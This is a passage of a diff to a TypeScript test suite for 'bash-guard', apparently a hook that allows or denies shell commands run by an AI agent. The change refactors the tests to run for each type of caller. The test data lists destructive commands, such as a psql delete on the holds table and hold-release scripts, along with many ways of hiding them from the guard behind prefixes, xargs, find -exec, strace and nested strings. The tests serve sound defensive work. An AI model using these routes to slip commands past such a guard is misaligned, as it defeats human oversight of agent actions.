-    "script -q /dev/null docker compose exec db psql -c 'update holds set x = 1'",
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads docker and psql behind a prefix",
+  (subagent) => {
+    test.each([
+      "caffeinate psql -c 'delete from holds'",
+      "caffeinate docker compose exec db psql -c 'update holds set x = 1'",
+      "echo 'delete from holds' | caffeinate psql",
+      "script -q /dev/null docker compose exec db psql -c 'update holds set x = 1'",
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("allows psql that does not name the holds table", async () => {
-    expect(
-      await decide("caffeinate psql -c 'select 1'", { subagent: true }),
-    ).toBe("allow");
-  });
-});
+    test("allows psql that does not name the holds table", async () => {
+      expect(await decide("caffeinate psql -c 'select 1'", { subagent })).toBe(
+        "allow",
+      );
+    });
+  },
+);
 
 // `2>&1`の`1`はファイル記述子の番号で、入力のファイルではない。
-describe("bash-guard does not take a file descriptor for an input file", () => {
-  test.each([
-    "ssh host ls 2>&1 | tail",
-    "script -q /dev/null ls > /tmp/out 2>&1",
-  ])("allows %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard does not take a file descriptor for an input file",
+  (subagent) => {
+    test.each([
+      "ssh host ls 2>&1 | tail",
+      "script -q /dev/null ls > /tmp/out 2>&1",
+    ])("allows %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // 前置きの後ろで語を足すコマンド、シェル、読めない標準入力を拒否するときは、前置きを外して書くよう伝える。
-describe("bash-guard explains how to rewrite a prefix it cannot read", () => {
-  test.each([
-    "caffeinate bash ./x.sh",
-    "ssh host < /tmp/x.sh",
-    "caffeinate xargs grep -l x",
-  ])("the reason for %s says to drop the prefix", async (command) => {
-    expect(await denyReason(command, { subagent: true })).toContain(
-      "without the prefix",
-    );
-  });
+describeForCallers(
+  "bash-guard explains how to rewrite a prefix it cannot read",
+  (subagent) => {
+    test.each([
+      "caffeinate bash ./x.sh",
+      "ssh host < /tmp/x.sh",
+      "caffeinate xargs grep -l x",
+    ])("the reason for %s says to drop the prefix", async (command) => {
+      expect(await denyReason(command, { subagent })).toContain(
+        "without the prefix",
+      );
+    });
 
-  test("the reason for a word built at run time still says to write it out", async () => {
-    expect(
-      await denyReason("script -q /dev/null ./scripts/hold.ts $ACTION 1", {
-        subagent: true,
-      }),
-    ).toContain("literal");
-  });
-});
+    test("the reason for a word built at run time still says to write it out", async () => {
+      expect(
+        await denyReason("script -q /dev/null ./scripts/hold.ts $ACTION 1", {
+          subagent,
+        }),
+      ).toContain("literal");
+    });
+  },
+);
 
 // 前置きの後ろの文字列の中でも、先頭が`mise`、実行系、`docker`の命令に、シェルや語を足すコマンドが並ぶ形は読めない。
 // 最上位で前置きの後ろに書いた形と同じに拒否する。
-describe("bash-guard applies the prefix rule to a string that starts with a launcher", () => {
-  test.each([
-    `script -qc "bun run x.ts bash ./x.sh" /dev/null`,
-    `ssh host "mise run check bash ./x.sh"`,
-    `script -qc "bun run find . -exec x {} +" /dev/null`,
-    `ssh host "docker compose exec app bun scripts/hold.ts release 1"`,
-    `script -qc "docker compose exec app bun scripts/freeze.ts reset" /dev/null`,
-    `ssh host "docker compose exec app bash"`,
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard applies the prefix rule to a string that starts with a launcher",
+  (subagent) => {
+    test.each([
+      `script -qc "bun run x.ts bash ./x.sh" /dev/null`,
+      `ssh host "mise run check bash ./x.sh"`,
+      `script -qc "bun run find . -exec x {} +" /dev/null`,
+      `ssh host "docker compose exec app bun scripts/hold.ts release 1"`,
+      `script -qc "docker compose exec app bun scripts/freeze.ts reset" /dev/null`,
+      `ssh host "docker compose exec app bash"`,
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test.each([
-    `ssh host "bun test"`,
-    `script -qc "mise run check" /dev/null`,
-    `ssh host "docker compose ps"`,
-    `ssh host "docker compose exec app bun test"`,
-  ])("allows %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+    test.each([
+      `ssh host "bun test"`,
+      `script -qc "mise run check" /dev/null`,
+      `ssh host "docker compose ps"`,
+      `ssh host "docker compose exec app bun test"`,
+    ])("allows %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // 文字列の中の先頭の変数代入は、値だけを先頭の語として判定する。実際に実行される語は別に判定する。
-describe("bash-guard reads only the value of an assignment in a string", () => {
-  test.each([
-    `ssh h "LANG=C rg -n release scripts/hold.ts"`,
-    `script -qc "LANG=C rg -n release scripts/hold.ts" /dev/null`,
-  ])("allows %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard reads only the value of an assignment in a string",
+  (subagent) => {
+    test.each([
+      `ssh h "LANG=C rg -n release scripts/hold.ts"`,
+      `script -qc "LANG=C rg -n release scripts/hold.ts" /dev/null`,
+    ])("allows %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // 入力の複製(`<&3`)、出力の複製(`>&3`)、`/dev/null`を入力にする形は、字面では見分けられないので、読めない入力として拒否する。
-describe("bash-guard keeps a duplicated descriptor and /dev/null as an unreadable input", () => {
-  test.each([
-    "script -q /dev/null <&3",
-    "ssh host <&3",
-    "ssh host <&0",
-    "ssh host >&3",
-    "ssh host < /dev/null",
-    "script -q /dev/null mise run check >&3",
-  ])("denies %s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard keeps a duplicated descriptor and /dev/null as an unreadable input",
+  (subagent) => {
+    test.each([
+      "script -q /dev/null <&3",
+      "ssh host <&3",
+      "ssh host <&0",
+      "ssh host >&3",
+      "ssh host < /dev/null",
+      "script -q /dev/null mise run check >&3",
+    ])("denies %s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 上限を超えた拒否の理由は、変数やglobの語がなくても拒否されうることを伝える。
-describe("bash-guard explains a denial caused by a budget", () => {
-  test("names the pipeline length and input size in the reason", async () => {
-    const reason = await denyReason(
-      `${"caffeinate true | ".repeat(257)}caffeinate true`,
-      { subagent: true },
-    );
-    expect(reason).toContain("too long or its input too large");
-  });
-
-  test.each(["freeze:reset", "push:prune"])(
-    "names %s as an operation the denial covers",
-    async (task) => {
+describeForCallers(
+  "bash-guard explains a denial caused by a budget",
+  (subagent) => {
+    test("names the pipeline length and input size in the reason", async () => {
       const reason = await denyReason(
         `${"caffeinate true | ".repeat(257)}caffeinate true`,
-        { subagent: true },
+        { subagent },
       );
-      expect(reason).toContain(task);
-    },
-  );
-});
+      expect(reason).toContain("too long or its input too large");
+    });
+
+    test.each(["freeze:reset", "push:prune"])(
+      "names %s as an operation the denial covers",
+      async (task) => {
+        const reason = await denyReason(
+          `${"caffeinate true | ".repeat(257)}caffeinate true`,
+          { subagent },
+        );
+        expect(reason).toContain(task);
+      },
+    );
+  },
+);
 
 // 数千の代入の語と、数千の語や上流のコマンドを並べた文字列でも、フックのタイムアウト(10秒)の中で終える。
-describe("bash-guard finishes long assignment and pipeline input in time", () => {
-  test("finishes thousands of assignments and words in one string", async () => {
-    const started = Date.now();
-    await decide(
-      `script -qc "${"A=1 ".repeat(5000)}echo ${"x ".repeat(5000)}" /dev/null`,
-      { subagent: true },
-    );
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
-
-  test("finishes a pipeline of thousands of commands in a nested string", async () => {
-    const started = Date.now();
-    const pipeline = `${"echo x | ".repeat(3000)}vim a`;
-    await decide(`script -qc "script -qc '${pipeline}' /dev/null" /dev/null`, {
-      subagent: true,
+describeForCallers(
+  "bash-guard finishes long assignment and pipeline input in time",
+  (subagent) => {
+    test("finishes thousands of assignments and words in one string", async () => {
+      const started = Date.now();
+      await decide(
+        `script -qc "${"A=1 ".repeat(5000)}echo ${"x ".repeat(5000)}" /dev/null`,
+        { subagent },
+      );
+      expect(Date.now() - started).toBeLessThan(3000);
     });
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
 
-  test("finishes a pipeline of thousands of commands ending in a hold word", async () => {
-    const started = Date.now();
-    const pipeline = `${"echo x | ".repeat(3000)}python3 scripts/hold.ts list`;
-    await decide(`script -qc '${pipeline}' /dev/null`, { subagent: true });
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
-});
+    test("finishes a pipeline of thousands of commands in a nested string", async () => {
+      const started = Date.now();
+      const pipeline = `${"echo x | ".repeat(3000)}vim a`;
+      await decide(
+        `script -qc "script -qc '${pipeline}' /dev/null" /dev/null`,
+        {
+          subagent,
+        },
+      );
+      expect(Date.now() - started).toBeLessThan(3000);
+    });
+
+    test("finishes a pipeline of thousands of commands ending in a hold word", async () => {
+      const started = Date.now();
+      const pipeline = `${"echo x | ".repeat(3000)}python3 scripts/hold.ts list`;
+      await decide(`script -qc '${pipeline}' /dev/null`, { subagent });
+      expect(Date.now() - started).toBeLessThan(3000);
+    });
+  },
+);
 
 // 最上位の長いパイプラインでも、フックのタイムアウト(10秒)の中で終える。
-describe("bash-guard finishes a long top-level pipeline in time", () => {
-  test("finishes a pipeline of three thousand prefixed commands", async () => {
-    const started = Date.now();
-    await decide(`${"caffeinate true | ".repeat(3000)}caffeinate true`, {
-      subagent: true,
+describeForCallers(
+  "bash-guard finishes a long top-level pipeline in time",
+  (subagent) => {
+    test("finishes a pipeline of three thousand prefixed commands", async () => {
+      const started = Date.now();
+      await decide(`${"caffeinate true | ".repeat(3000)}caffeinate true`, {
+        subagent,
+      });
+      expect(Date.now() - started).toBeLessThan(3000);
     });
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
 
-  test("allows a prefixed command behind 256 pipeline stages", async () => {
-    expect(
-      await decide(`${"caffeinate true | ".repeat(256)}caffeinate true`, {
-        subagent: true,
-      }),
-    ).toBe("allow");
-  });
+    test("allows a prefixed command behind 256 pipeline stages", async () => {
+      expect(
+        await decide(`${"caffeinate true | ".repeat(256)}caffeinate true`, {
+          subagent,
+        }),
+      ).toBe("allow");
+    });
 
-  test("denies a prefixed command behind 257 pipeline stages", async () => {
-    expect(
-      await decide(`${"caffeinate true | ".repeat(257)}caffeinate true`, {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
-});
+    test("denies a prefixed command behind 257 pipeline stages", async () => {
+      expect(
+        await decide(`${"caffeinate true | ".repeat(257)}caffeinate true`, {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
+  },
+);
 
 // 前置きのコマンドを256段つなぎ、各段に語を並べた1行。語の数が予算(3万語)に収まるかで分かれる。
 function widePipeline(stages: number, wordsPerStage: number): string {
@@ -3216,454 +3503,500 @@ const WIDE_PIPELINE_TIMEOUT_MS = 20000;
 // 時間のテストは、判定の締め切りが決定を変えないよう、経過しない時計で測る。締め切りの働きは別のテストで固定している。
 const NEVER_EXPIRES = () => 0;
 
-describe("bash-guard bounds the work for a wide prefixed pipeline", () => {
-  test(
-    "allows 256 stages of about a hundred words each in time",
-    async () => {
-      const started = Date.now();
-      const decision = await decide(widePipeline(256, 100), {
-        subagent: true,
-        now: NEVER_EXPIRES,
-      });
-      expect(decision).toBe("allow");
-      expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
-    },
-    WIDE_PIPELINE_TIMEOUT_MS,
-  );
+describeForCallers(
+  "bash-guard bounds the work for a wide prefixed pipeline",
+  (subagent) => {
+    test(
+      "allows 256 stages of about a hundred words each in time",
+      async () => {
+        const started = Date.now();
+        const decision = await decide(widePipeline(256, 100), {
+          subagent,
+          now: NEVER_EXPIRES,
+        });
+        expect(decision).toBe("allow");
+        expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
+      },
+      WIDE_PIPELINE_TIMEOUT_MS,
+    );
 
-  test(
-    "denies 256 stages of about two hundred words each in time",
-    async () => {
-      const started = Date.now();
-      const decision = await decide(widePipeline(256, 200), {
-        subagent: true,
-        now: NEVER_EXPIRES,
-      });
-      expect(decision).toBe("deny");
-      expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
-    },
-    WIDE_PIPELINE_TIMEOUT_MS,
-  );
+    test(
+      "denies 256 stages of about two hundred words each in time",
+      async () => {
+        const started = Date.now();
+        const decision = await decide(widePipeline(256, 200), {
+          subagent,
+          now: NEVER_EXPIRES,
+        });
+        expect(decision).toBe("deny");
+        expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
+      },
+      WIDE_PIPELINE_TIMEOUT_MS,
+    );
 
-  test(
-    "denies 256 stages of eight hundred words each in time",
-    async () => {
-      const started = Date.now();
-      const decision = await decide(widePipeline(256, 800), {
-        subagent: true,
-        now: NEVER_EXPIRES,
-      });
-      expect(decision).toBe("deny");
-      expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
-    },
-    WIDE_PIPELINE_TIMEOUT_MS,
-  );
-});
+    test(
+      "denies 256 stages of eight hundred words each in time",
+      async () => {
+        const started = Date.now();
+        const decision = await decide(widePipeline(256, 800), {
+          subagent,
+          now: NEVER_EXPIRES,
+        });
+        expect(decision).toBe("deny");
+        expect(Date.now() - started).toBeLessThan(WIDE_PIPELINE_LIMIT_MS);
+      },
+      WIDE_PIPELINE_TIMEOUT_MS,
+    );
+  },
+);
 
 // 解析の回数と、走査した語の数の予算を超えたら、判定できないものとして拒否する。
-describe("bash-guard denies input that passes the analysis budget", () => {
-  test("denies a string with 257 assignments", async () => {
-    expect(
-      await decide(`script -qc "${"A=1 ".repeat(257)}echo x" /dev/null`, {
-        subagent: true,
-      }),
-    ).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard denies input that passes the analysis budget",
+  (subagent) => {
+    test("denies a string with 257 assignments", async () => {
+      expect(
+        await decide(`script -qc "${"A=1 ".repeat(257)}echo x" /dev/null`, {
+          subagent,
+        }),
+      ).toBe("deny");
+    });
 
-  test("allows a string with 200 assignments", async () => {
-    expect(
-      await decide(`script -qc "${"A=1 ".repeat(200)}echo x" /dev/null`, {
-        subagent: true,
-      }),
-    ).toBe("allow");
-  });
+    test("allows a string with 200 assignments", async () => {
+      expect(
+        await decide(`script -qc "${"A=1 ".repeat(200)}echo x" /dev/null`, {
+          subagent,
+        }),
+      ).toBe("allow");
+    });
 
-  test("denies a string whose pipeline passes the word budget", async () => {
-    const started = Date.now();
-    const decision = await decide(
-      `script -qc '${"vim a | ".repeat(500)}vim a' /dev/null`,
-      { subagent: true },
-    );
-    expect(decision).toBe("deny");
-    expect(Date.now() - started).toBeLessThan(3000);
-  });
-});
+    test("denies a string whose pipeline passes the word budget", async () => {
+      const started = Date.now();
+      const decision = await decide(
+        `script -qc '${"vim a | ".repeat(500)}vim a' /dev/null`,
+        { subagent },
+      );
+      expect(decision).toBe("deny");
+      expect(Date.now() - started).toBeLessThan(3000);
+    });
+  },
+);
 
 // 出力の複製(`2>&1`)と、閉じる指定(`<&-`)は、読めない入力ではない。
-describe("bash-guard allows a duplicated output and a closed input behind a prefix", () => {
-  test.each(["script -q /dev/null mise run check 2>&1", "ssh host <&-"])(
-    "%s",
-    async (command) => {
-      expect(await decide(command, { subagent: true })).toBe("allow");
-    },
-  );
-});
+describeForCallers(
+  "bash-guard allows a duplicated output and a closed input behind a prefix",
+  (subagent) => {
+    test.each(["script -q /dev/null mise run check 2>&1", "ssh host <&-"])(
+      "%s",
+      async (command) => {
+        expect(await decide(command, { subagent })).toBe("allow");
+      },
+    );
+  },
+);
 
 // 語を足す文脈(`xargs`、`find -exec`、先頭の`parallel`、`watch`、`strace`)は、実行される側が読み取りの閉じた集合に入らなければ、
 // 指す語の有無によらず拒否する。足される語は字面から読めないためである。
-describe("bash-guard denies a subagent that adds words with xargs to a program outside the read-only set", () => {
-  test.each([
-    "echo hold:release 1 | xargs mise run",
-    "ls scripts | xargs -I{} bun {} release 1",
-    "printf 'rel%s 1\\n' ease | xargs ./scripts/hold.ts",
-    "echo release | xargs -I@ ./scripts/freeze.ts @ 1",
-    "echo a | xargs vim",
-    "echo a | xargs python3 x.py",
-    "echo a | xargs chmod +x",
-    "echo a | xargs sh -c 'true'",
-    "echo a | xargs ./cat",
-    "echo a | xargs -0 -n1 -P4 awk 1",
-    "env X=1 xargs ln -s",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that adds words with xargs to a program outside the read-only set",
+  (subagent) => {
+    test.each([
+      "echo hold:release 1 | xargs mise run",
+      "ls scripts | xargs -I{} bun {} release 1",
+      "printf 'rel%s 1\\n' ease | xargs ./scripts/hold.ts",
+      "echo release | xargs -I@ ./scripts/freeze.ts @ 1",
+      "echo a | xargs vim",
+      "echo a | xargs python3 x.py",
+      "echo a | xargs chmod +x",
+      "echo a | xargs sh -c 'true'",
+      "echo a | xargs ./cat",
+      "echo a | xargs -0 -n1 -P4 awk 1",
+      "env X=1 xargs ln -s",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // `git`、`rg`、`sort`と検査の道具は、オプションを標準入力から受けられる(`--pre`、`-o`、`--exec`)ので、`xargs`の後ろでは通さない。
-describe("bash-guard denies a subagent that passes xargs a tool that can run what it reads", () => {
-  test.each([
-    "echo a | xargs git add",
-    "git ls-files | xargs git log",
-    "echo a | xargs rg x",
-    "echo a | xargs sort",
-    "echo a | xargs sed -n 1p",
-    "echo a | xargs tee out",
-    "echo a | xargs tsc",
-    "echo a | xargs bunx biome check",
-    "echo a | xargs bun test",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that passes xargs a tool that can run what it reads",
+  (subagent) => {
+    test.each([
+      "echo a | xargs git add",
+      "git ls-files | xargs git log",
+      "echo a | xargs rg x",
+      "echo a | xargs sort",
+      "echo a | xargs sed -n 1p",
+      "echo a | xargs tee out",
+      "echo a | xargs tsc",
+      "echo a | xargs bunx biome check",
+      "echo a | xargs bun test",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 実行される側を決めるには、`xargs`のオプションを読み飛ばす。知らないオプションがあると位置が決まらないので拒否する。
-describe("bash-guard denies a subagent whose xargs option it does not know", () => {
-  test.each([
-    "echo a | xargs --future-flag grep x",
-    "echo a | xargs -X grep x",
-    "echo a | xargs -0X grep x",
-    "echo a | xargs --no-such=1 cat",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller whose xargs option it does not know",
+  (subagent) => {
+    test.each([
+      "echo a | xargs --future-flag grep x",
+      "echo a | xargs -X grep x",
+      "echo a | xargs -0X grep x",
+      "echo a | xargs --no-such=1 cat",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
-describe("bash-guard denies a subagent that runs a program outside the read-only set through find", () => {
-  test.each([
-    "find scripts -name hold.ts -exec bun run {} release 1 \\;",
-    "find scripts -name hold.ts -execdir bun ./{} release 1 \\;",
-    "find scripts -name hold.ts -ok bun {} \\;",
-    "find scripts -name hold.ts -okdir bun {} \\;",
-    "find scripts -name 'hol?.ts' -exec bun {} release 1 \\;",
-    "find . -exec vim {} +",
-    "find . -exec git add {} +",
-    "find . -exec rg x {} +",
-    "find . -exec sh -c 'true' _ {} \\;",
-    "find . -exec {} \\;",
-    "find . -execdir {} release 1 \\;",
-    "find . -exec ./cat {} \\;",
-    "find . -exec cat {} \\; -exec chmod +x {} \\;",
-    "find . -exec cat {} \\; -execdir vim {} +",
-    "env find . -exec vim {} +",
-    "echo a | xargs find . -exec cat {} +",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that runs a program outside the read-only set through find",
+  (subagent) => {
+    test.each([
+      "find scripts -name hold.ts -exec bun run {} release 1 \\;",
+      "find scripts -name hold.ts -execdir bun ./{} release 1 \\;",
+      "find scripts -name hold.ts -ok bun {} \\;",
+      "find scripts -name hold.ts -okdir bun {} \\;",
+      "find scripts -name 'hol?.ts' -exec bun {} release 1 \\;",
+      "find . -exec vim {} +",
+      "find . -exec git add {} +",
+      "find . -exec rg x {} +",
+      "find . -exec sh -c 'true' _ {} \\;",
+      "find . -exec {} \\;",
+      "find . -execdir {} release 1 \\;",
+      "find . -exec ./cat {} \\;",
+      "find . -exec cat {} \\; -exec chmod +x {} \\;",
+      "find . -exec cat {} \\; -execdir vim {} +",
+      "env find . -exec vim {} +",
+      "echo a | xargs find . -exec cat {} +",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // `parallel`、`watch`、`strace`には例外を作らない。後ろの語を実行する仕組みが、集合の中の道具にも及ぶためである。
-describe("bash-guard denies a subagent that starts parallel, watch, or strace", () => {
-  test.each([
-    "parallel ./scripts/hold.ts release 1 ::: a",
-    "parallel echo ::: a b",
-    "parallel :::: /tmp/args",
-    "watch -n 1 cat x",
-    "watch 'mise run hold:release 1'",
-    "strace -f cat x",
-    "strace -o /tmp/out bun scripts/hold.ts release 1",
-    "env strace ls",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that starts parallel, watch, or strace",
+  (subagent) => {
+    test.each([
+      "parallel ./scripts/hold.ts release 1 ::: a",
+      "parallel echo ::: a b",
+      "parallel :::: /tmp/args",
+      "watch -n 1 cat x",
+      "watch 'mise run hold:release 1'",
+      "strace -f cat x",
+      "strace -o /tmp/out bun scripts/hold.ts release 1",
+      "env strace ls",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
-describe("bash-guard allows a subagent to add words only to a read-only tool", () => {
-  test.each([
-    "git ls-files | xargs cat",
-    "find . -name '*.ts' | xargs grep -l x",
-    "ls | xargs -n1 head",
-    "echo a | xargs -0 -P4 wc -l",
-    "echo a | xargs -r stat",
-    "echo a | xargs file",
-    "echo a | xargs basename",
-    "ls | xargs",
-    "ls | xargs echo",
-    "echo hold:release | xargs echo",
-    "echo a | xargs -n 1 -- cat",
-    "echo a | xargs --max-args=2 ls",
-    "echo a | xargs /usr/bin/head",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
+describeForCallers(
+  "bash-guard allows a caller to add words only to a read-only tool",
+  (subagent) => {
+    test.each([
+      "git ls-files | xargs cat",
+      "find . -name '*.ts' | xargs grep -l x",
+      "ls | xargs -n1 head",
+      "echo a | xargs -0 -P4 wc -l",
+      "echo a | xargs -r stat",
+      "echo a | xargs file",
+      "echo a | xargs basename",
+      "ls | xargs",
+      "ls | xargs echo",
+      "echo hold:release | xargs echo",
+      "echo a | xargs -n 1 -- cat",
+      "echo a | xargs --max-args=2 ls",
+      "echo a | xargs /usr/bin/head",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
 
-  test.each([
-    "find . -name '*.ts' -exec cat {} +",
-    "find . -exec grep -l release {} +",
-    "find . -exec egrep -l release {} \\;",
-    "find . -exec fgrep -l release {} \\;",
-    "find scripts -name hold.ts -exec cat {} \\;",
-    "find scripts -name hold.ts -exec head -n 3 {} \\;",
-    "find . -exec tail -n 3 {} \\;",
-    "find . -exec ls -l {} +",
-    "find . -execdir stat {} \\;",
-    "find . -ok wc -l {} \\;",
-    "find . -okdir file {} \\;",
-    "find . -exec realpath {} +",
-    "find . -exec cat {} \\; -exec head {} \\;",
-    "find . -name x -print",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+    test.each([
+      "find . -name '*.ts' -exec cat {} +",
+      "find . -exec grep -l release {} +",
+      "find . -exec egrep -l release {} \\;",
+      "find . -exec fgrep -l release {} \\;",
+      "find scripts -name hold.ts -exec cat {} \\;",
+      "find scripts -name hold.ts -exec head -n 3 {} \\;",
+      "find . -exec tail -n 3 {} \\;",
+      "find . -exec ls -l {} +",
+      "find . -execdir stat {} \\;",
+      "find . -ok wc -l {} \\;",
+      "find . -okdir file {} \\;",
+      "find . -exec realpath {} +",
+      "find . -exec cat {} \\; -exec head {} \\;",
+      "find . -name x -print",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
 // `find`が探索で見つけたパスは起点を前に付けて渡すので`-`から始まらない。
 // 起点の綴りは`tsc`と`biome`のオプションに渡りうるが受け入れ、`find`の後ろに限って検査の道具を通す。
-describe("bash-guard allows a subagent to run an inspection tool through find", () => {
-  test.each([
-    "find . -exec tsc --noEmit {} +",
-    "find . -exec biome check {} +",
-    "find . -exec bunx biome check {} +",
-    "find . -exec bunx --bun biome check {} \\;",
-    "find . -execdir bunx biome check {} \\;",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("allow");
-  });
-});
+describeForCallers(
+  "bash-guard allows a caller to run an inspection tool through find",
+  (subagent) => {
+    test.each([
+      "find . -exec tsc --noEmit {} +",
+      "find . -exec biome check {} +",
+      "find . -exec bunx biome check {} +",
+      "find . -exec bunx --bun biome check {} \\;",
+      "find . -execdir bunx biome check {} \\;",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("allow");
+    });
+  },
+);
 
-describe("bash-guard denies a subagent that runs code through find with a runner", () => {
-  test.each([
-    "find . -exec bun x-ray {} +",
-    "find . -exec bun -e 'true' test {} +",
-    "find . -exec node {} +",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that runs code through find with a runner",
+  (subagent) => {
+    test.each([
+      "find . -exec bun x-ray {} +",
+      "find . -exec bun -e 'true' test {} +",
+      "find . -exec node {} +",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // `test`を最初のオペランドとする実行系は、テストのファイルを読み込んで実行する。外部の挙動は確かめられないので、`find`の後ろでも通さない。
-describe("bash-guard denies a subagent that runs a test runner through find", () => {
-  test.each([
-    "find . -exec bun test {} +",
-    "find . -exec deno test {} +",
-    "find . -exec npm test {} +",
-    "find . -exec bun run test {} +",
-    "find . -execdir bun test --preload ./x.ts {} \\;",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
-});
+describeForCallers(
+  "bash-guard denies a caller that runs a test runner through find",
+  (subagent) => {
+    test.each([
+      "find . -exec bun test {} +",
+      "find . -exec deno test {} +",
+      "find . -exec npm test {} +",
+      "find . -exec bun run test {} +",
+      "find . -execdir bun test --preload ./x.ts {} \\;",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
+  },
+);
 
 // 実行される側が決まらない`xargs`は拒否する。前置きや置換のオプションが、後ろの語を別のコマンドに変えるためである。
-describe("bash-guard denies a subagent whose xargs command cannot be told", () => {
-  test.each([
-    "ls | xargs env cat",
-    "ls | xargs nohup cat",
-    "ls | xargs time cat",
-    "ls | xargs command cat",
-    "ls | xargs timeout 5 cat",
-    "ls | xargs sudo cat",
-    "ls | xargs xargs cat",
-    "ls | xargs mise exec -- cat",
-    "ls | xargs FOO=1 cat",
-    "ls | xargs -I{} cat {}",
-    "ls | xargs -n1 -I{} head {}",
-    "ls | xargs -J % cat %",
-    "ls | xargs -i cat {}",
-    "ls | xargs --replace cat {}",
-    "ls | xargs --replace=@ cat @",
-    "ls | xargs -0I{} cat {}",
-  ])("%s", async (command) => {
-    expect(await decide(command, { subagent: true })).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard denies a caller whose xargs command cannot be told",
+  (subagent) => {
+    test.each([
+      "ls | xargs env cat",
+      "ls | xargs nohup cat",
+      "ls | xargs time cat",
+      "ls | xargs command cat",
+      "ls | xargs timeout 5 cat",
+      "ls | xargs sudo cat",
+      "ls | xargs xargs cat",
+      "ls | xargs mise exec -- cat",
+      "ls | xargs FOO=1 cat",
+      "ls | xargs -I{} cat {}",
+      "ls | xargs -n1 -I{} head {}",
+      "ls | xargs -J % cat %",
+      "ls | xargs -i cat {}",
+      "ls | xargs --replace cat {}",
+      "ls | xargs --replace=@ cat @",
+      "ls | xargs -0I{} cat {}",
+    ])("%s", async (command) => {
+      expect(await decide(command, { subagent })).toBe("deny");
+    });
 
-  test("allows a bare xargs, which runs echo", async () => {
-    expect(await decide("ls | xargs", { subagent: true })).toBe("allow");
-  });
-});
+    test("allows a bare xargs, which runs echo", async () => {
+      expect(await decide("ls | xargs", { subagent })).toBe("allow");
+    });
+  },
+);
 
 // `--max-lines`の値は`=`付きで渡す(GNU)。次の語は値でなく、実行される側である。
-describe("bash-guard reads the next word after xargs --max-lines as the command", () => {
-  test("denies a program outside the read-only set after --max-lines", async () => {
-    expect(
-      await decide("echo a | xargs --max-lines flock cat", { subagent: true }),
-    ).toBe("deny");
-  });
+describeForCallers(
+  "bash-guard reads the next word after xargs --max-lines as the command",
+  (subagent) => {
+    test("denies a program outside the read-only set after --max-lines", async () => {
+      expect(
+        await decide("echo a | xargs --max-lines flock cat", { subagent }),
+      ).toBe("deny");
+    });
 
-  test("allows a read-only tool after --max-lines with a value", async () => {
-    expect(
-      await decide("echo a | xargs --max-lines=2 cat", { subagent: true }),
